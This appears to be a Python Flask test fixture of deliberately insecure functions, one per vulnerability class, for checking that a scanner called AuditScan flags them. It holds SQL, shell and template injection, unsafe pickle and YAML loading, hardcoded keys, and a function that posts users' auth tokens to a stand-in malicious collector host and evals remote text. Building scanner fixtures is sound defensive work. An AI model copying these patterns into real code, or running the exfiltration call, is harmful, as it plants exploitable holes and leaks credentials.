"""Vulnerability lab: intentionally insecure demo code (DO NOT COPY).

Each function demonstrates one vulnerability class so a rescan shows how
AuditScan detects it. These patterns are deliberately bad on purpose and
exist only in this sample file. Never use them in production.
"""

import csv
import hashlib
import io
import logging
import os
import pickle
import random
import re
import shutil
import sqlite3
import subprocess
import tempfile
import xml.etree.ElementTree as ET
import zipfile

import jwt
import requests
import yaml
from flask import Flask, redirect, request, url_for

app = Flask(__name__)

API_KEY = "sk-live-4f8a9c2d6e1b7a3f5c8d0e6a2b4c8d0e6"  # hardcoded secret (demo)
JWT_SECRET = "jwt-secret-demo-only-123456"  # hardcoded JWT secret (demo)

UPLOAD_DIR = "/tmp/uploads"


# ---------------------------------------------------------------- 15 common
def sqli_fstring():
    user = request.args.get("q", "")
    conn = sqlite3.connect("app.db")
    cursor = conn.cursor()
    cursor.execute(f"SELECT * FROM users WHERE name = '{user}'")


def sqli_percent():
    user = request.args.get("q", "")
    conn = sqlite3.connect("app.db")
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE name = '%s'" % user)


def sqli_concat():
    user = request.args.get("q", "")
    conn = sqlite3.connect("app.db")
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE name = '" + user + "'")


def second_order_store():
    nickname = request.form.get("nickname", "")
    save_nickname(nickname)


def save_nickname(nickname):
    conn = sqlite3.connect("app.db")
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE nickname = '" + nickname + "'")


def xss_reflected():
    from markupsafe import Markup
    name = request.args.get("name", "")
    return Markup("<h1>Hello " + name + "</h1>")


def cmdi_deliberate():
    cmd = input("admin command> ")
    os.system(cmd)  # deliberate: operator-typed command still unsanitized


def cmdi_shell_join():
    filename = request.args.get("file", "")
    subprocess.run("ls -la " + filename, shell=True)  # unknowingly: shell join


def path_delete_unknowing():
    filename = request.args.get("file", "")
    # Unknowingly: traversal like ../../etc/passwd escapes UPLOAD_DIR.
    os.remove(os.path.join(UPLOAD_DIR, filename))


def wipe_deliberate():
    target = input("wipe dir> ")
    shutil.rmtree(target, ignore_errors=True)  # deliberate wipe


def pickle_deser():
    blob = request.args.get("blob", "")
    return pickle.loads(blob.encode())


def ssrf_eval_exfil():
    target = request.args.get("url", "")
    token = request.headers.get("Authorization", "")
    resp = requests.get(target, headers={"Authorization": token}, timeout=5)
    requests.post("https://collector.malicious-metrics.com/api/events",
                  json={"token": token, "body": resp.text[:500]}, timeout=5)
    return eval(resp.text)  # executes code returned by the remote party


def open_redirect():
    nxt = request.args.get("next", "/")
    return redirect(nxt)


def weak_md5_login(password):
    request.args.get("u", "")
    return hashlib.md5(password.encode()).hexdigest()


def jwt_none_login():
    payload = {"sub": request.args.get("u", "")}
    return jwt.encode(payload, key=JWT_SECRET, algorithm="none")


# ------------------------------------------------------------ 20 rarer ones
def redos_search():
    user_text = request.args.get("q", "")
    return re.match(r"^(a+)+$", user_text)


def zipslip_extract():
    archive_path = request.args.get("archive", "")
    with zipfile.ZipFile(archive_path) as zf:
        zf.extractall("/tmp/extracted")


def yaml_unsafe_load():
    raw = request.args.get("doc", "")
    return yaml.load(raw)


def ssti_greet():
    name = request.args.get("name", "")
    from flask import render_template_string
    return render_template_string("Hello " + name)


def mass_assignment():
    data = request.json.get("profile", {})
    class Profile:
        pass
    profile = Profile()
    profile.__dict__.update(data)
    return profile


def insecure_random_token():
    request.args.get("u", "")
    return "tok-" + str(random.random())


def timing_compare():
    provided = request.args.get("token", "")
    real_secret = os.getenv("ADMIN_TOKEN", "demo-secret")
    if provided == real_secret:
        return True
    return False


def insecure_temp():
    request.args.get("u", "")
    return tempfile.mktemp()


def xxe_parse():
    xml_data = request.args.get("xml", "")
    return ET.fromstring(xml_data)


def xpath_query():
    username = request.args.get("u", "")
    tree = ET.parse("users.xml")
    return tree.getroot().xpath("//user[name='" + username + "']")


def nosql_where():
    user_filter = request.args.get("q", "")
    import pymongo
    client = pymongo.MongoClient("mongodb://localhost:27017/")
    return client.app.users.find({"$where": user_filter})


def csv_export():
    rows = request.json.get("rows", [])
    buf = io.StringIO()
    writer = csv.writer(buf)
    for row in rows:
        writer.writerow(row)
    return buf.getvalue()


def host_header_reset():
    host = request.headers.get("Host", "")
    return redirect("https://" + host + url_for("reset_password"))


def reset_password():
    return "reset page"


def ldap_search():
    username = request.args.get("u", "")
    import ldap
    conn = ldap.initialize("ldap://localhost")
    return conn.search_s("dc=example,dc=com", 2, "(uid=" + username + ")")


def unbounded_read():
    request.args.get("name", "")
    blob = request.files["upload"].read()
    return len(blob)


@app.route("/api/heavy", methods=["POST"])
def heavy_no_rate_limit():
    data = request.json
    total = sum(range(1000000))
    return {"ok": True, "total": total, "echo": str(data)[:50]}


@app.route("/page")
def page_no_frame_headers():
    from flask import render_template_string
    name = request.args.get("name", "")
    return render_template_string("<h1>Hi " + name + "</h1>")


def sensitive_log():
    password = request.args.get("password", "")
    logging.info("login attempt password=%s", password)


def plaintext_api():
    request.args.get("u", "")
    return requests.get("http://internal-legacy.example.com/api/users", timeout=5).text


def tls_disabled():
    request.args.get("u", "")
    return requests.get("https://internal.example.com/api", verify=False, timeout=5).text


if __name__ == "__main__":
    app.run(debug=True)
    CORS_ORIGINS = "*"
